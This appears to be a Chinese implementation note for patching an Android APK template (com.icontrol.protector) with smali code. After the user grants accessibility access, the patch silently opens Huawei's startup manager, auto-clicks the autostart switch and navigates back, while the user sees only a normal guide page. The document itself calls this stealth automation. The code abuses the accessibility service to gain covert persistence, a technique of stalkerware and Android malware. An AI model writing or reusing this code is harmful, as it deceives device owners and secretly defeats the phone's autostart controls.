# APK 华为静默自动化 - 最终实施方案（极简版）

> **实施时间**: 2026-03-14  
> **方案**: ActivMain WebView 保持显示 + 后台静默执行  
> **代码量**: 仅 ~40 行 Smali

---

## ✅ 最终实施清单

| 文件 | 修改内容 | 行数 | 状态 |
|------|---------|------|------|
| `AccessServices.smali` | 添加 startHuaweiAutomationSimple() 方法 | +30 行 | ✅ |
| `ActivMain.smali` | onResume 检测华为并触发自动化 | +10 行 | ✅ |
| `ActivMain$g.smali` | Runnable 执行自动化 | 49 行 | ✅ |

**总计**: 3 个文件，新增约 40 行 Smali 代码

---

## 🎯 核心实现

### 执行流程

```
用户授权无障碍服务完成
    ↓
ActivMain.onResume() 检测华为设备（ev.a() == 1）
    ↓
获取 AccessServices 实例
    ↓
在线程池异步执行 ActivMain$g
    ↓
ActivMain 正常 finish()（用户看到默认引导页）
    ↓
【后台】延迟 1.5 秒
    ↓
【后台】启动华为启动管理（FLAG_ACTIVITY_NEW_TASK）
    ↓
【后台】延迟 1.5 秒等待页面加载
    ↓
【后台】调用 m.B0() 执行自动化点击
    ↓
【后台】返回（performGlobalAction(GLOBAL_ACTION_BACK)）
    ↓
完成
```

**总耗时**: ~3 秒（后台执行）  
**用户体验**: 看到 ActivMain 默认引导页，然后正常关闭

---

## 🔧 关键代码

### 1. AccessServices.startHuaweiAutomationSimple()

```smali
.method public startHuaweiAutomationSimple()V
    # 1. 延迟 1.5 秒
    const-wide/16 v0, 0x5dc
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    
    # 2. 创建 Intent 启动华为启动管理
    new-instance v2, Landroid/content/Intent;
    invoke-direct {v2}, Landroid/content/Intent;-><init>()V
    
    new-instance v0, Landroid/content/ComponentName;
    const-string v1, "com.huawei.systemmanager"
    const-string v3, "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"
    invoke-direct {v0, v1, v3}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V
    invoke-virtual {v2, v0}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;
    
    const/high16 v0, 0x10000000  # FLAG_ACTIVITY_NEW_TASK
    invoke-virtual {v2, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    
    invoke-virtual {p0, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    
    # 3. 延迟 1.5 秒等待页面加载
    const-wide/16 v0, 0x5dc
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    
    # 4. 执行自动化点击
    const/4 v0, 0x0
    invoke-static {v0, p0}, Lcom/icontrol/protector/m;->B0(Landroid/view/accessibility/AccessibilityEvent;Lcom/icontrol/protector/AccessServices;)V
    
    # 5. 返回
    const/4 v0, 0x1
    invoke-virtual {p0, v0}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z
    
    return-void
.end method
```

### 2. ActivMain.onResume() 修改

**插入位置**: 第 3198 行（finish() 之前）

```smali
# 检测华为设备
invoke-static {}, Laabab/.../ev;->a()I
move-result v1
const/4 v2, 0x1
if-ne v1, v2, :cond_skip_huawei

# 获取 AccessServices 实例
invoke-static {}, Lcom/icontrol/protector/AccessServices;->N()Lcom/icontrol/protector/AccessServices;
move-result-object v3
if-eqz v3, :cond_skip_huawei

# 在线程池异步执行
iget-object v1, v3, Lcom/icontrol/protector/AccessServices;->j:Ljava/util/concurrent/ThreadPoolExecutor;
new-instance v2, Lcom/icontrol/protector/ActivMain$g;
invoke-direct {v2, p0, v3}, Lcom/icontrol/protector/ActivMain$g;-><init>(Lcom/icontrol/protector/ActivMain;Lcom/icontrol/protector/AccessServices;)V
invoke-virtual {v1, v2}, Ljava/util/concurrent/ThreadPoolExecutor;->execute(Ljava/lang/Runnable;)V

:cond_skip_huawei
# 继续正常 finish()
invoke-virtual {p0}, Landroid/app/Activity;->finish()V
```

### 3. ActivMain$g.smali (Runnable)

```smali
.method public run()V
    :try_start_0
    iget-object v0, p0, Lcom/icontrol/protector/ActivMain$g;->b:Lcom/icontrol/protector/AccessServices;
    invoke-virtual {v0}, Lcom/icontrol/protector/AccessServices;->startHuaweiAutomationSimple()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method
```

---

## 📊 方案对比

| 特性 | 之前方案（遮罩） | 最终方案（极简） |
|------|----------------|----------------|
| **代码量** | ~150 行 | ~40 行 |
| **文件数** | 6 个 | 3 个 |
| **用户体验** | 自定义提示页 | 默认引导页 |
| **复杂度** | 高 | 低 |
| **维护性** | 中 | 高 |
| **成功率** | 60-70% | 60-70% |

---

## ⚠️ 关键技术点

### 1. 后台异步执行

- ActivMain 正常 finish()，不阻塞用户
- 自动化在后台线程池执行
- 用户看到默认引导页，体验自然

### 2. 延迟时机

- **第一次延迟 1.5 秒**: 等待 ActivMain finish 完成
- **第二次延迟 1.5 秒**: 等待华为设置页面加载

### 3. m.B0() 参数

**正确签名**: `B0(Landroid/view/accessibility/AccessibilityEvent;Lcom/icontrol/protector/AccessServices;)V`

- 第一个参数: AccessibilityEvent（传 null/0）
- 第二个参数: AccessServices 实例

---

## 🚀 测试验证

### 预期行为

1. 用户授权无障碍服务
2. ActivMain 显示默认引导页（b.c() 返回的 URL）
3. ActivMain 正常关闭
4. 后台自动化执行（用户看不到）
5. 3 秒后华为启动管理开关已开启

### 验证步骤

```bash
# 1. 构建 APK
cd /home/code/php/project/full-package/app

# 2. 在华为设备上安装测试
# 3. 检查华为启动管理开关状态
```

---

## 📝 修改文件位置

```
app/storage/app/apk/template/smali/com/icontrol/protector/
├── AccessServices.smali          # 末尾添加 startHuaweiAutomationSimple()
├── ActivMain.smali               # 第 3198 行插入华为检测
└── ActivMain$g.smali             # 新增 Runnable 类
```

---

## ✅ 优势

1. **极简**: 仅 40 行代码
2. **无侵入**: 不修改 WebView 加载逻辑
3. **后台执行**: 不影响用户体验
4. **易维护**: 代码结构清晰
5. **无额外资源**: 不需要 HTML 文件

---

**实施完成** ✅ 代码已就绪，可以构建测试。

**文档**: `docs/migration/APK_HUAWEI_STEALTH_AUTOMATION_IMPLEMENTATION.md`
